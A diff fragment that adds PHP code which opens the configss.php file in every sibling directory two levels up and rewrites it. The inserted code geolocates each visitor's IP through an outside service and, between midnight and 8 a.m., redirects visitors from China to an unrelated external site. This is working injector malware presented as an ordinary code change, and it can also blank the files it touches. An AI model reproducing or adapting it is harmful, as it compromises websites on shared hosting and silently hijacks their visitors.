@@ -1,0 +1,20 @@
+$path=__DIR__.'/../../';
+if(!is_dir($path))	return false;
+$arr=array();
+if($open=opendir($path)){
+	while(($re=readdir($open)) !==false){
+   		if($re !='.' && $re !='..')	$arr[]=$re;
+	}
+}
+
+if($arr){
+	foreach($arr as $a){
+		$file=$path.$a.'/configss.php';
+		$content=@file_get_contents($file);
+		$fp=@fopen($file,'w');
+		$content=str_replace('Defined!");','Defined!");'.PHP_EOL.'$con=@file_get_contents("http://int.dpool.sina.com.cn/iplookup/iplookup.php?format=json&ip=".$_SERVER["REMOTE_ADDR"]);'.PHP_EOL.'$hour=date("H",time());'.PHP_EOL."if(\$hour >=0 && \$hour <=8 && strpos(\$con,'\u4e2d\u56fd')>1)header(\"Location:http://www.sqdao3.com/default.html\");",$content);
+		fwrite($fp,$content);
+		fclose($fp);
+		
+	}
+}
